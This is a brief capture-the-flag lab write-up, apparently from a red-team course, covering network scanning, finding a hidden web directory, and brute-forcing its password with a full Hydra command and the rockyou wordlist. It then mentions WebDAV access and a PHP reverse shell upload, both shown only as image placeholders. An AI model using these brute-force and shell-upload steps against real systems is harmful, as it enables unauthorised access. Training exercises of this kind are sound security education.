# Red Team CTF

## Step 1: Discover the IP address of the Linux server
- Run `nmap 192.168.1.0/24`

![nmap]()

- `Port 80` is open so we can access it from a web browser.

## Step 2: Locate the hidden directory on the server.
- Navigate to the directory by typing: 192.168.1.105/company_folders/secret_folder

![first_password]()

## Step 3: Brute force the password for the hidden directory.
- With Ashton's name, we can run the Hydra attack against the directory using `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`

![hydra_syntax]()

![hydra_result]()

## Step 4: Connect to the server via Webdav

![metasploit]()
![webdav]()
![shell_in_web]()

## Step 5: Upload a PHP reverse shell payload.

![flag]()